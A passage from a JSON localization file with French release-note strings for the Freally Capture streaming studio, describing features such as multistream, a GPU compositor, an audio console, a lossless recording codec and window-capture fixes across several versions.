imbriquées et une incrustation de chat en direct qui ne demande <strong>jamais de clé d'API ni de connexion</strong>.","changelog.feb4e52158c8":"Ajouté — la diffusion en profondeur","changelog.75834546387e":"<strong>Multistream simultané</strong> (TASK-601) — passez en direct sur plusieurs destinations à la fois, <strong>directement vers chaque plateforme</strong> (sans serveur de restream). Les destinations dont les réglages d'encodage concordent <strong>partagent un seul encodage matériel</strong> (réparti par le <code>tee</code> de ffmpeg) ; des réglages différents sont encodés séparément. Une destination en échec est isolée sur sa propre voie de reconnexion, si bien qu'elle ne peut jamais entraîner une destination saine ; le dock de statistiques affiche l'état et le débit de chaque destination indépendamment.","changelog.d7881741d3bc":"<strong>SRT et WHIP</strong> (TASK-602) — diffusez vers une réception SRT auto-hébergée ou un point de terminaison WebRTC WHIP en plus de RTMP/RTMPS, avec reconnexion et suivi d'état. La prise en charge de SRT/WHIP par le ffmpeg installé est vérifiée honnêtement au passage en direct. Les clés de stream WHIP passent par l'en-tête <code>Authorization</code>, jamais par l'URL.","changelog.01e2ed129c31":"<strong>Tampon de replay continu</strong> (TASK-603) — lorsqu'il est armé, un encodage en arrière-plan conserve les N dernières secondes sous forme de petits segments sur le disque (mémoire et disque bornés) ; un raccourci global les sauvegarde dans un fichier lisible <strong>sans interrompre le stream ni l'enregistrement</strong>, avec des préréglages de durée et de qualité.","changelog.8abd1a3e56cd":"<strong>Canevas vertical / multi-canevas</strong> (TASK-604) — un second canevas (par ex. 9:16) composé à partir de n'importe quelle scène à sa propre taille, <strong>enregistrable et diffusable indépendamment</strong> du canevas principal ; avec un aperçu en direct et sa propre statistique de fps.","changelog.2c69be261f19":"Ajouté — scènes, sources, filtres et encodeurs en profondeur","changelog.be269b309b79":"<strong>Scènes imbriquées, groupes de sources et audio par scène</strong> (TASK-605) — une scène composée comme une source à l'intérieur d'une autre (protégé contre les cycles) ; des groupes qui se déplacent, s'affichent et se masquent ensemble ; une surcharge de la console par scène pour qu'une scène puisse sonner différemment du mix global.","changelog.5c7ab998f7ed":"<strong>Packs de transitions</strong> (TASK-606) — un <strong>stinger</strong> (une vidéo par-dessus la coupe), une <strong>image de volet luma personnalisée</strong> et davantage de motifs de volet intégrés (horizontal / losange / horloge).","changelog.4d324b472fe3":"<strong>Source Diaporama d'images + préréglages de cartes d'acquisition</strong> (TASK-607) — un ensemble ordonné d'images qui défilent selon un minuteur avec un fondu enchaîné facultatif, boucle/maintien de la dernière et lecture aléatoire ; les préréglages de format Elgato/AVerMedia courants dans le sélecteur de périphérique vidéo (uniquement les modes que la carte annonce réellement).","changelog.67f18114a372":"<strong>Filtres d'incrustation couleur / luma + délai de rendu</strong> (TASK-608) — détourez n'importe quelle couleur par distance RVB (fonds autres que verts), incrustez selon la luminosité, et retardez la vidéo d'une source de N ms pour l'aligner sur l'audio.","changelog.8349cff49176":"<strong>Encodeurs en profondeur</strong> (TASK-609) — couleurs <strong>Rec.709</strong> fixées sur chaque encodage standard (fini les couleurs HD délavées ou décalées), une <strong>réduction de la résolution de sortie</strong> facultative (enregistrer/diffuser à une autre résolution que celle du canevas — par destination de stream) et des chemins haute fréquence (120/144/240 fps) + 4K. Le HDR est documenté honnêtement comme hors périmètre (le canevas est en SDR 8 bits).","changelog.e821097e85ca":"<strong>Marqueurs de chapitre dans l'enregistrement</strong> (TASK-610) — un raccourci de marqueur insère un chapitre dans l'enregistrement en cours (chapitres mkv, ou fichier annexe lisible pour les autres conteneurs). Les marqueurs de stream côté plateforme nécessitent les API des comptes — exclus par la charte, ce que le produit dit honnêtement.","changelog.9ee401a2a83a":"<strong>Incrustation de chat en direct</strong> (TASK-613) — un relevé transparent et horodaté, sur le canevas, du chat entrant du direct (nom d'utilisateur + message + horodatage sur 12 heures). <strong>L'utilisateur final n'a jamais besoin de clé d'API, de compte développeur ni de connexion pour YouTube ou Twitch :</strong> YouTube est lu par un client InnerTube propre à l'application, exactement comme le lecteur web, Twitch par IRC anonyme, et Kick interroge son point de terminaison public. Un afflux de messages ne fait que pousser les anciennes lignes vers la sortie — il ne peut jamais bloquer le stream, l'enregistrement ou l'incrustation.","changelog.fcfab0e66cef":"<strong>Incrustation de réactions flottantes</strong> (TASK-614) — les émojis de réaction des spectateurs montent et s'estompent <strong>directement dans le programme</strong> (enregistrés et diffusés), depuis la barre de réactions de l'application ou repérés dans la même réception de chat sans clé ; un réservoir de particules borné fait qu'un afflux de réactions ne fait que plafonner ce qui s'affiche à l'écran.","changelog.b7f3aacf8907":"Reporté (en toute honnêteté)","changelog.d7babe268df3":"<strong>Caméra virtuelle en profondeur</strong> (TASK-611) — une vraie caméra virtuelle est un composant pilote signé du système (un jalon à part entière). Le modèle de flux (programme / vertical / source unique) et la jonction de transport par système sont livrés dès maintenant ; le bouton reste désactivé, avec toute l'explication dans son infobulle.","changelog.d1bbc34e384f":"<strong>Source navigateur</strong> (TASK-612) — une étude de conception (<code>design/browser-source-spike.md</code>) recommande une intégration de type CEF livrée comme composant à la demande (comme ffmpeg) ; la décision revient à Mike.","changelog.39e93c6d3eb9":"<span class=\"release__meta\"><span class=\"release__ver\">v0.70.0</span><time class=\"release__date\" datetime=\"2026-07-06\">2026-07-06</time></span><span class=\"release__title\">(Diffusion + MVP du studio — première version publique)</span>","changelog.2b4289185858":"Le studio avec lequel vous pouvez passer en direct : diffusion RTMP/RTMPS vers une destination, mode Studio + transitions GPU, raccourcis globaux, profils + collections de scènes, un vrai dock de statistiques — et la collaboration P2P complète des <strong>Invités à distance</strong>, intégrée depuis la phase R.","changelog.1ab82763e794":"<strong>Diffusion vers une destination</strong> (RTMP/RTMPS vers Twitch/YouTube/Kick/Facebook/Trovo/personnalisé) avec une clé de stream secrète et masquée, une reconnexion à temporisation progressive et l'enregistrement automatique au passage en direct ; l'enregistrement local n'est jamais affecté par l'état du stream.","changelog.5d254b2963c1":"<strong>Mode Studio + transitions GPU</strong> — un volet d'aperçu en direct et une transition de validation (coupe/fondu/glissement/balayage/luma) que voit le public.","changelog.a95243dac70b":"<strong>Raccourcis globaux</strong> (enregistrer / passer en direct / transition) et un <strong>vrai dock de statistiques</strong> (fps / images perdues / ms de rendu + % CPU et mémoire de ce processus).","changelog.1bff268c26f0":"<strong>Profils + collections de scènes</strong> — des réglages et des instantanés de scènes interchangeables, conservés d'un redémarrage à l'autre.","changelog.3e3cc955eb95":"<strong>Invités à distance (phase R)</strong> — collaboration à distance P2P/WebRTC, à activer soi-même : liens d'invitation qui expirent, micro de l'invité dans la console, coupure à deux verrous, mise en avant de l'intervenant, la disposition écran + coins, et un relais TURN appartenant à l'utilisateur, à activer lui aussi (aucune infrastructure exploitée par l'auteur).","changelog.2fd6b77c5ce7":"<span class=\"release__meta\"><span class=\"release__ver\">v0.56.0</span><time class=\"release__date\" datetime=\"2026-07-06\">2026-07-06</time></span><span class=\"release__title\">(Aperçu GPU natif + améliorations de la Capture de fenêtre)</span>","changelog.6536f40e75b5":"L'aperçu donne désormais la <em>sensation</em> d'OBS sous <strong>Windows, macOS et Linux</strong> : la sortie GPU du compositeur est peinte directement à l'écran, sans aller-retour de relecture et d'encodage — et la Capture de fenêtre propose des vignettes en direct, survit à un redémarrage et se rétablit d'elle-même.","changelog.c5202dd3e1c5":"Ajouté — aperçu GPU natif (« sensation OBS ») sous Windows, macOS et Linux","changelog.b77d015fe905":"<strong>Une surface d'aperçu GPU native sans copie</strong> qui remplace l'aperçu relecture → JPEG → canvas par la propre sortie GPU du compositeur, peinte directement à l'écran — sans aller-retour d'encodage, sans latence. Par système : sous <strong>Windows</strong>, une surface <strong>DirectComposition</strong> (wgpu <code>SurfaceTargetUnsafe::CompositionVisual</code> sur DX12) composée <em>au-dessus</em> de WebView2, <strong>vérifiée en temps réel sur du vrai matériel</strong> ; sous <strong>macOS</strong>, un <strong>CAMetalLayer</strong> par-dessus la WKWebView (Metal) ; sous <strong>Linux</strong>, une fenêtre enfant X11 qui pilote une surface <strong>Vulkan/GL</strong> (Wayland garde l'aperçu JPEG pour l'instant). Les trois sont <strong>prouvés en CI comme effectuant le rendu</strong> — le test de fumée par capture d'écran vérifie les pixels réels à chaque push. Le <strong>cadre de sélection et les poignées de transformation interactifs sont dessinés dans l'image GPU elle-même</strong> (aperçu uniquement — jamais enregistrés ni diffusés). Sous le capot, la pile GPU est <strong>passée de wgpu 0.20 à 27</strong>. L'aperçu JPEG reste la solution de repli universelle et revient automatiquement dès que la surface native n'est pas viable (un GPU Windows sans DX12, Wayland, une surface perdue).","changelog.0f1a68ade361":"Ajouté — un sélecteur de fenêtres avec vignettes en direct qui liste toutes les fenêtres","changelog.dc9f6df8df56":"<strong>Le sélecteur de la Capture de fenêtre affiche désormais une vignette en direct de chaque fenêtre ouverte</strong> — une grille de tuiles faites de vraies images capturées, actualisées tant que le sélecteur est ouvert (de façon échelonnée pour que son ouverture ne surcharge pas le backend), avec un bouton d'actualisation manuelle. Les vignettes transitent sous forme d'<strong>URI JPEG <code>data:</code> en mémoire via IPC — rien n'est jamais écrit sur le disque</strong>, si bien qu'elles disparaissent dès la fermeture du sélecteur.","changelog.3519efd99c8a":"<strong>Les fenêtres réduites sont aussi listées</strong> (elles étaient auparavant filtrées) : Windows se rabat sur la taille restaurée de la fenêtre lorsqu'elle est réduite en icône, macOS énumère les fenêtres hors écran, et Linux/X11 les listait déjà. Un <strong>job de CI dédié à l'énumération des fenêtres</strong> ouvre deux fenêtres, en réduit une et vérifie que les deux apparaissent.","changelog.87f9b12b0ac3":"<strong>La bordure jaune de capture de Windows a disparu</strong> — les sessions Windows.Graphics.Capture demandent désormais l'absence de bordure (dans la mesure du possible ; les anciennes versions de Windows qui ne le prennent pas en charge conservent l'ancien comportement).","changelog.a153cea5d4be":"Ajouté — une Capture de fenêtre qui se reconnecte au redémarrage + récupération automatique","changelog.3e74cf2927b9":"**Une Capture de fenêtre se rattache à la <em>même</em> fenêtre quand vous relancez l'application<strong> — comme le fait OBS Studio. Un handle de fenêtre du système (<code>HWND</code> sous Windows, <code>CGWindowID</code> sous macOS, XID sous X11) n'est valable que le temps d'une session : une source Fenêtre enregistrée stocke donc aussi l'</strong>identité durable<strong> de la fenêtre — son exécutable / application propriétaire, sa classe de fenêtre et son titre — et, au démarrage, </strong>retrouve la fenêtre active en faisant correspondre cette identité**, ancrée sur l'application pour ne jamais se lier à un programme sans rapport (la classe + le titre départagent plusieurs fenêtres d'une même application). Les identifiants réduits au seul handle des anciennes scènes enregistrées se chargent toujours. <em>Windows est vérifié sur du vrai matériel ; macOS (ScreenCaptureKit) et Linux/X11 partagent le même algorithme de correspondance et sont validés en CI ; Wayland n'est pas concerné — son portail système fait choisir à nouveau la source et est déjà durable.</em>","changelog.55f49748f04d":"<strong>Les captures en erreur se rétablissent d'elles-mêmes.</strong> Une source Capture d'écran / de fenêtre / vidéo qui a échoué parce que sa fenêtre, son écran ou sa caméra n'était pas encore là est <strong>retentée automatiquement</strong> (temporisation exponentielle par source, de 3 s en doublant jusqu'à 60 s), si bien qu'elle passe en direct dès que la fenêtre se rouvre ou que le périphérique se reconnecte — sans avoir à cliquer sur Réessayer (le bouton Réessayer reste là pour relancer à la demande). Les sources du portail de sélection d'écran et les sources média ne sont pas concernées.","changelog.e0a0ac02515e":"<strong>Une fenêtre capturée qui se ferme en cours de session est détectée de manière fiable.</strong> L'événement de fin de capture de Windows ne se déclenche jamais pour certaines applications élevées ou qui se cachent dans la zone de notification, ce qui aurait laissé la source figée « en direct » sur sa dernière image ; la capture surveille désormais aussi le handle de la fenêtre lui-même et passe en erreur dès que la fenêtre a réellement disparu — ce qui arme justement la récupération automatique décrite ci-dessus.","changelog.67f786726842":"<strong>Le curseur de la souris est désormais suivi dans la Capture de fenêtre — que la fenêtre ait le focus ou non.</strong> Windows ne compose le curseur que dans les captures de la fenêtre <em>active</em> (une fenêtre inactive n'a pas de curseur, et aucune image du tout tant que son contenu est statique), si bien qu'une application capturée sur laquelle vous ne cliquiez pas semblait figée. Freally Capture <strong>dessine désormais le curseur lui-même</strong>, comme OBS — les vraies formes de curseur (alpha, masque classique et curseurs inversants), suivies en direct et composées dans l'image, avec des images synthétisées lorsque seul le curseur a bougé. Mesuré sur du vrai matériel : une fenêtre inactive est passée de ~0 mise à jour à <strong>55 fps en mouvement rapide / 32 fps à vitesse de survol</strong>. La <strong>capture d'écran</strong> a reçu le même traitement : le curseur continue de bouger dans un enregistrement même quand le reste du bureau est statique.","changelog.768c67ad0574":"<span class=\"release__meta\"><span class=\"release__ver\">v0.55.0</span><time class=\"release__date\" datetime=\"2026-07-03\">2026-07-03</time></span><span class=\"release__title\">(Console audio + enregistrement)</span>","changelog.82a067a13f56":"L'échelon 0.55.0 regroupe la <strong>phase 3 (console audio + filtres)</strong> et la <strong>phase 4 (enregistrement)</strong> — le studio peut désormais mixer et <strong>enregistrer</strong> son flux programme sur le disque, en multipiste, avec le meilleur encodeur matériel disponible ou le codec sans perte maison.","changelog.6550f4141d88":"Ajouté — enregistrement (phase 4)","changelog.8f276d78647e":"<strong>Le codec sans perte maison <code>freally-video</code> (<code>.frec</code>)</strong> (<code>fcap-encode</code>) : le format d'enregistrement local par défaut, conçu ici et <strong>entièrement détenu</strong> — deltas temporels entre images + prédiction du pixel de gauche façon PNG + une étape <strong>FLZ</strong> (LZ77) maison alignée sur l'octet, chaque technique étant libre de brevets depuis des décennies ou dans le domaine public, <strong>aucune dépendance, rien de téléchargé</strong>, <code>#![forbid(unsafe_code)]</code>. Le conteneur transporte jusqu'à <strong>6 pistes PCM stéréo entrelacées</strong> avec des positions d'échantillon absolues (synchro A/V + pause sans blanc par construction), des images intra toutes les ~2 s, un index de recherche et un <strong>lecteur tolérant à la troncature</strong> (un enregistrement interrompu par un plantage se lit jusqu'à son dernier bloc complet ; une entrée corrompue produit une erreur, jamais une panique, et les allocations sont plafonnées face aux fichiers malveillants). Vérifié en temps réel : un encodage synthétique en 1080p60 tient son budget.","changelog.8d5c44a0b1af":"<strong>Détection des encodeurs + catalogue des encodeurs</strong> : une sonde GPU <code>wgpu</code> (identifiants de fabricant + heuristiques sur le nom, rasteriseurs logiciels ignorés) pilote des règles d'offre par système — <strong>NVENC / Quick Sync / AMF</strong> sous Windows, <strong>NVENC / VAAPI</strong> (conditionné au render node) sous Linux, <strong>VideoToolbox</strong> sous macOS — toujours accompagnés des solutions de repli CPU universelles <strong>x264 / x265 / AV1</strong>. Les encodeurs matériels sont proposés comme candidats honnêtes et <strong>confirmés par un véritable encodage de test de 3 images</strong> à la première utilisation (la prise en charge varie selon le GPU + le pilote) ; chaque encodeur standard indique sa dépendance à ffmpeg.","changelog.14fd14e34068":"<strong>Multiplexage multipiste, conteneurs et découpage des fichiers</strong> : enregistrez en <strong>mp4 / mkv / mov / webm</strong> (codecs standard) ou dans le format maison <strong><code>.frec</code></strong> (sans perte), avec <strong>jusqu'à 6 pistes audio</strong>, et un <strong>découpage automatique des fichiers</strong> en segments autonomes lisibles. Le moteur d'enregistrement suit une horloge à fréquence d'images strictement constante (nombre d'images verrouillé sur le temps enregistré), si bien que l'audio et la vidéo restent synchronisés malgré les ralentissements et que <strong>la pause/reprise se fait sans blanc dans un seul fichier lisible</strong>. L'enregistrement principal est conçu pour continuer quel que soit l'état du stream (la diffusion arrive dans 0.70.0), et une <strong>copie locale à pistes séparées</strong> est conservée pour lui.","changelog.a153199fe59d":"<strong>Le pont ffmpeg à la demande, clairement identifié</strong> (<code>fcap-encode::ffmpeg</code>) : les codecs standard soumis à brevets (H.264/AAC/HEVC/AV1) passent par ffmpeg, qui n'est <strong>jamais intégré</strong>. À la première utilisation, il est téléchargé depuis une <strong>build épinglée par système</strong> (URL + <strong>SHA-256 inscrit dans le code source</strong>, recoupé avec la somme de contrôle du publieur), <strong>vérifié par hachage avant toute exécution</strong> (une non-concordance interrompt l'installation), extrait (un seul membre — les chemins de l'archive ne servent jamais à écrire) et piloté comme <strong>processus séparé</strong> (ce qui isole aussi sa licence LGPL/GPL de l'application). Un panneau <strong>Composants</strong> clairement identifié indique ce que c'est, pourquoi il existe, la source épinglée et la progression en direct (% / du total / MB/s) ; le chemin <code>.frec</code> maison n'en a pas du tout besoin.","changelog.823a023c395e":"<strong>Enregistrement HEVC / AV1 + remux après enregistrement</strong> : HEVC et AV1 s'enregistrent par le chemin ffmpeg dédié (en matériel lorsque le GPU le permet) ; une liste <strong>Enregistrements</strong> (Contrôles → Fichiers…) affiche les fichiers terminés, du plus récent au plus ancien, et propose <strong>Remux vers MP4</strong> (mkv → mp4, <code>-c copy</code>, sans réencodage, faststart, balise <code>hvc1</code> pour le HEVC). La commande de remux vérifie que le chemin se trouve dans le dossier des enregistrements — la webview ne peut jamais la diriger vers des fichiers arbitraires.","changelog.8f8423224424":"<strong>Réglages et préréglages des encodeurs</strong> (Paramètres → Sortie) : contrôle du débit <strong>CBR / VBR / CQP</strong> + débit + intervalle des images clés, préréglages <strong>Qualité / Équilibré / Performance</strong> par encodeur (traduits sur le réglage propre à chaque famille), débit audio par piste, et préréglages d'enregistrement <strong>Sans perte / Haute qualité / Équilibré</strong> en un clic. Commandes d'enregistrement dans le dock : <strong>Démarrer / Arrêter / Pause / Reprendre</strong>, un indicateur <strong>REC</strong> clignotant avec la durée (pauses exclues) + le nombre de pistes, et les fichiers de la dernière session ou son erreur, exposée honnêtement.","changelog.a6dabb1cab06":"<strong>La source Média</strong> (<code>fcap-sources::media</code>) — reprise de la phase 2 : un fichier vidéo ou image composé sur le canevas <strong>avec son audio dans la console</strong>. Les images fixes sont décodées une seule fois (comme la source Image) ; <strong>le <code>.frec</code> est lu par le codec maison</strong>, sans rien télécharger ; les formats standard sont décodés par le composant ffmpeg dédié (décodage matériel <code>-hwaccel auto</code>, repli logiciel, boucle/redémarrage), et un chien de garde d'arrêt garantit qu'un décodeur bloqué ne puisse jamais bloquer le studio. L'audio des médias passe par un nouveau <strong>concentrateur audio des médias</strong>, si bien qu'un clip média obtient une tranche complète dans la console (fader, filtres, pistes, décalage de synchro) sans cas particulier.","changelog.78a7ab9818b8":"Ajouté — console audio (phase 3)","changelog.bb86ddd81916":"<strong>Le moteur audio maison</strong> (<code>fcap-audio</code>) : un graphe de capture <code>cpal</code> qui traite tout en interne en <strong>stéréo f32 à 48 kHz</strong> par blocs de 10 ms. Capture par source du <strong>micro / de l'entrée ligne</strong> (Entrée audio) et de l'<strong>audio du bureau / du système</strong> (Sortie audio), chacune convertie et rééchantillonnée vers l'horloge du moteur par un <strong>rééchantillonneur linéaire en flux maison</strong>. L'audio du bureau est présenté honnêtement selon le système : <strong>Windows</strong> capture n'importe quel périphérique de sortie via le <strong>loopback WASAPI</strong> ; <strong>Linux</strong> utilise un périphérique <strong>monitor</strong> PipeWire/PulseAudio ; <strong>macOS</strong> a besoin d'un périphérique de bouclage virtuel (par ex. BlackHole) tant qu'un chemin audio ScreenCaptureKit n'est pas disponible — les sélecteurs le disent et filtrent les périphériques virtuels connus.","changelog.4541b9b25062":"<strong>Le graphe de mixage</strong> : par source, <strong>délai de décalage de synchro → chaîne de filtres → appuyer pour parler / appuyer pour couper / muet / fader</strong>, acheminé vers <strong>jusqu'à 6 bus de piste</strong> (attribution par source), le mix du <strong>programme (master)</strong> et un mix de <strong>monitoring</strong>. Un lissage du gain d'environ 8 ms, sans clic, à chaque changement de coupure, de PTT ou de fader. Tout le cœur est pur et <strong>indépendant des périphériques — chaque règle de routage est testée unitairement sans matériel</strong>.","changelog.805988055894":"<strong>L'ensemble de filtres DSP classiques maison — aucun apprentissage automatique nulle part, conformément à la charte</strong> : <strong>Débruitage</strong> (suppression spectrale STFT avec une FFT radix-2 maison — trames √Hann de 512 échantillons, recouvrement de 50 %, suivi du plancher de bruit par bande de fréquence + soustraction spectrale ; le bruit stable baisse tandis que la parole passe), <strong>Noise Gate</strong> (hystérésis + maintien), <strong>Compresseur</strong> (détection de crête, gain de compensation), <strong>Limiteur</strong> (attaque instantanée avec un plafond strict), <strong>Égaliseur 3 bandes</strong> (biquads plateau/cloche RBJ), <strong>Gain</strong>, et <strong>Ducking</strong> par sidechain (atténuer une source sous une autre). Chaque processeur est borné de façon défensive pour qu'une scène modifiée à la main ne puisse pas s'emballer.","changelog.d379afe46aba":"<strong>Monitoring, ducking, PTT/PTM et LUFS</strong> : une <strong>sortie de monitoring</strong> sur n'importe quel périphérique (bornée, résistante aux sous-remplissages) ; un ducking par sidechain piloté par l'enveloppe en direct de la source déclencheuse ; <strong>Appuyer pour parler / Appuyer pour couper</strong> via des raccourcis globaux (enregistrés à partir du modèle, en restant honnête sur l'absence de raccourcis globaux sous Wayland) ; un indicateur <strong>LUFS pondéré K selon BS.1770</strong> (momentané + court terme) sur le mix du programme ; une mesure crête/RMS par source.","changelog.df9eeebe72aa":"<strong>Le panneau Console audio</strong> : une <strong>tranche</strong> par source audio de la scène active — nom + état, un <strong>vumètre</strong> (vert→jaune→rouge, repère de crête), un <strong>fader</strong> (−60…+6 dB), <strong>muet</strong>, un cycle de <strong>monitoring</strong>, une boîte de dialogue <strong>filtres audio</strong> (les 7 filtres, avec un sélecteur de déclencheur pour le ducking), des <strong>points de piste 1–6</strong> et une fenêtre contextuelle avancée (décalage de synchro + raccourcis PTT/PTM). Un affichage <strong>LUFS</strong> et un sélecteur de <strong>périphérique de monitoring</strong> (conservé dans les paramètres). Les sources audio apparaissent dans le rail Sources avec les mêmes points d'état en direct que la vidéo, et dans le menu <strong>Ajouter une source</strong> avec des sélecteurs de périphériques honnêtes selon le système.","changelog.97f0a5a2c868":"Le modèle scène/source (<code>fcap-scene</code>) gagne les types de source <strong>Entrée audio / Sortie audio</strong> et une tranche <strong><code>AudioSettings</code></strong> par source (fader, coupure, mode de monitoring, masque de bits des pistes, décalage de synchro, raccourcis PTT/PTM, chaîne ordonnée de filtres audio) — aller-retour serde testé, format camelCase vérifié, plages bornées, et autoréparation au chargement (l'état audio existe exactement sur les sources capables de produire de l'audio).","changelog.417eeb2ed567":"Sécurité / confidentialité","changelog.9fd51762b5f0":"La posture est inchangée et revérifiée : l'audio capturé et les images composées vont <strong>uniquement</strong> vers la console, le périphérique de monitoring choisi par l'utilisateur, le <strong>fichier d'enregistrement</strong> et la caméra virtuelle — <strong>rien ne quitte la machine</strong>, pas de comptes, pas de télémétrie. Le nom du périphérique de monitoring conservé dans les paramètres est validé en longueur et en forme ; les accélérateurs de raccourcis sont analysés et validés avant d'entrer dans le modèle.","changelog.ce84fae75efe":"<strong>La seule action réseau ajoutée à cet échelon est le téléchargement explicite de ffmpeg, déclenché par un clic de l'utilisateur</strong> — en TLS depuis une <strong>URL épinglée par système et codée en dur</strong>, <strong>vérifié par SHA-256 avant toute exécution du binaire</strong>, et piloté comme processus séparé. Il ne démarre jamais tout seul ; une somme de contrôle non concordante interrompt l'installation. Le chemin d'enregistrement <code>.frec</code> maison ne fait aucun appel réseau.","changelog.bafa8e1e2feb":"Les pistes audio ffmpeg du moteur d'enregistrement passent par des <strong>sockets en boucle locale uniquement (<code>127.0.0.1</code>)</strong> qui acceptent exactement une connexion puis se ferment ; les réglages d'enregistrement (identifiant d'encodeur, conteneur, débit, dossier, nom de fichier) sont <strong>validés en plage et en forme</strong> avant usage, et <strong>les actions de remux et sur les enregistrements sont confinées au dossier des enregistrements</strong> (vérification du parent canonisé), si bien que la webview ne peut pas atteindre de fichiers arbitraires. Les analyseurs <code>.frec</code>/média traitent les octets des fichiers comme <strong>non fiables</strong> — allocations plafonnées, erreur plutôt que panique sur une entrée corrompue.","changelog.ab6195393730":"Nouvelles dépendances tierces, toutes consignées dans <code>THIRD-PARTY-NOTICES.md</code> : <strong><code>tauri-plugin-global-shortcut</code></strong> (appuyer pour parler/couper), et l'ensemble téléchargement/vérification/décompression du pont ffmpeg (<strong><code>ureq</code></strong> + rustls, <strong><code>sha2</code></strong>, <strong><code>zip</code></strong>, <strong><code>tar</code></strong> + <strong><code>lzma-rs</code></strong>), plus <strong><code>chrono</code></strong> (noms de fichiers en heure locale). Le DSP audio et le codec <strong><code>freally-video</code></strong> sont <strong>entièrement maison</strong> ; ffmpeg est <strong>piloté, jamais intégré</strong>.","changelog.282c879e15bb":"<strong>Tests de fumée audio sur du vrai matériel</strong> (gardés en <code>--ignored</code> sur la CI sans écran), plus un garde-fou d'encodage <code>.frec</code> 1080p60 en mode release ; le parcours complet dans l'application téléchargement de ffmpeg → vérification → enregistrement → relecture constitue le test de fumée de publication de la phase 4.","changelog.78915e8e8933":"<span class=\"release__meta\"><span class=\"release__ver\">v0.40.0</span><time class=\"release__date\" datetime=\"2026-07-02\">2026-07-02</time></span><span class=\"release__title\">(Compositeur + scènes/sources)</span>","changelog.64aed5d4e90f":"<strong>Le compositeur GPU wgpu maison</strong> (<code>fcap-compositor</code>) : chaque élément de scène visible est composé de l'arrière vers l'avant dans l'image du programme avec, par élément, <strong>déplacement/échelle/rotation/rognage</strong> (une seule transformation de référence, testée unitairement), les sept <strong>modes de fusion</strong> (normal/addition/soustraction/écran/produit/éclaircir/assombrir sous forme d'états de fusion à fonction fixe), des envois BGRA/RGBA tenant compte du pas de ligne sans permutation sur le CPU, et un chemin de relecture sans écran. Des tests sur images de référence vérifient de vrais pixels GPU et sont ignorés de façon explicite sur les machines sans adaptateur ; le contrôle de performance matériel tient <strong>60 fps en 1080p avec 4 sources</strong> (5,2 ms/image mesurés sur une RTX 4070).","changelog.63af29da5231":"<strong>Le modèle scène/source/filtre maison</strong> (<code>fcap-scene</code>) : les scènes contiennent des éléments ordonnés (index = ordre d'empilement) ; les sources résident dans un réservoir partagé et sont référencées d'une scène à l'autre ; les éléments portent transformation/fusion/visibilité/verrouillage et une chaîne de filtres ordonnée. Aller-retour serde testé, tolérant aux clés inconnues, autoréparation au chargement — c'est le format de projet des collections de scènes, enregistré automatiquement (de façon atomique, avec anti-rebond) dans <code>scene-collection.json</code> dans le dossier de configuration du système.","changelog.d4fa625cbe70":"<strong>La chaîne de filtres vidéo sur le GPU</strong>, par élément et paramétrable en direct : <strong>Incrustation chroma</strong> (avec suppression du débordement), <strong>Correction des couleurs</strong> (gamma/luminosité/contraste/saturation/teinte/opacité), <strong>LUT</strong> (.cube → treillis 3D), <strong>Flou</strong> (gaussien séparable), <strong>Masque d'image</strong> (alpha/luma, inversion), <strong>Netteté</strong>, <strong>Défilement</strong> (bandeau en boucle) et <strong>Rognage</strong> — ordonnés, activables, chacun vérifié sur les pixels rendus. Les filtres dont le fichier n'est pas chargé sont ignorés, jamais rendus en noir.","changelog.fe58cb003f91":"<strong>Nouvelles sources</strong> : <strong>Image</strong> (PNG/JPEG/BMP/GIF/WebP…), <strong>Couleur</strong> (aplat) et <strong>Texte</strong> — une vraie mise en forme via rustybuzz (liaisons arabes, ligatures, crénage), bidi RTL UAX #9, retour à la ligne automatique, alignement, interligne, rastérisation tiny-skia avec anticrénelage. La <strong>famille Noto Sans complète est intégrée</strong> (polices variables : toutes les graisses/largeurs, romain + italique + arabe + hébreu ; OFL-1.1 embarquée, provenance épinglée + hachée) avec un <strong>repli par écriture pour chaque segment de texte</strong>, si bien que le texte s'affiche à l'identique sur toutes les machines ; les familles du système restent sélectionnables et un fichier de police a la priorité.","changelog.4a4b0eca4f12":"<strong>L'environnement d'exécution du studio</strong> : les sessions de capture et les sources statiques se réconcilient avec la scène active à chaque tick ; les éléments nouvellement ajoutés s'ajustent automatiquement dès leur première image ; l'image composée du programme alimente le même canal <code>preview://</code> interne au processus à ~30 fps pendant que la composition tourne à ~60 ; l'état en direct/en attente/en erreur de chaque source + les fps de composition passent par l'événement <code>program</code>. Une machine sans GPU reçoit un rapport honnête « pas de GPU » au lieu d'un canevas figé.","changelog.42c0a344221a":"<strong>L'interface du studio</strong> : un rail <strong>Scènes</strong> fonctionnel (ajouter/sélectionner/renommer/réordonner/supprimer), un rail <strong>Sources</strong> avec visibilité/verrouillage/ordre d'empilement/état par élément et un menu d'ajout couvrant chaque type implémenté (plus le partage de sources entre scènes), des <strong>poignées de transformation précises au pixel près sur le canevas</strong> (glisser, mise à l'échelle par coin/bord, rotation avec aimantation à 15°, rognage par Alt-glisser), une boîte de dialogue <strong>Filtres</strong> (mode de fusion + chaîne modifiable en direct) et des boîtes de dialogue <strong>Propriétés</strong> propres à chaque type.","changelog.eaef04a3aa25":"Remarques honnêtes sur le périmètre","changelog.52f9e72e5682":"<strong>Média</strong> (fichiers vidéo) est <strong>intégré à la phase d'enregistrement</strong> (décision du 2026-07-02) : il s'appuie sur l'architecture des codecs standard / du décodage matériel (ffmpeg à la demande) — il n'existe aucun décodeur vidéo généraliste en pur Rust, et les bouchons sont contraires à la charte.","changelog.9f015d62a029":"La <strong>source navigateur</strong> passe à la phase de diffusion en profondeur, derrière une <strong>étude de conception de webview hors écran</strong> (Tauri v2 ne peut pas rendre une webview dans une texture de façon multiplateforme).","changelog.fb9378d724c2":"Le <strong>texte CJK</strong> utilise pour l'instant les polices du système — Noto CJK (~100 MB) n'est pas intégré ; l'ensemble intégré couvre le latin/grec/cyrillique + l'arabe + l'hébreu.","changelog.30f499446f84":"La posture est inchangée : les images composées du programme restent <strong>dans le processus</strong>, derrière le schéma <code>preview://</code> à CORS restreint ; le seul fichier qu'écrit le studio est la collection de scènes locale. Les nouvelles dépendances tierces (<code>wgpu</code> à l'exécution, <code>image</code>, <code>tiny-skia</code>, <code>fontdb</code>, <code>unicode-bidi</code>, <code>pollster</code>) sont sous licences permissives et consignées dans <code>THIRD-PARTY-NOTICES.md</code>.","changelog.19084c726e61":"<span class=\"release__meta\"><span class=\"release__ver\">v0.25.0</span><time class=\"release__date\" datetime=\"2026-07-01\">2026-07-01</time></span><span class=\"release__title\">(Le cœur de la capture)</span>","changelog.a7a34cfb1a75":"<strong>Capture d'écran et de fenêtre par système</strong> 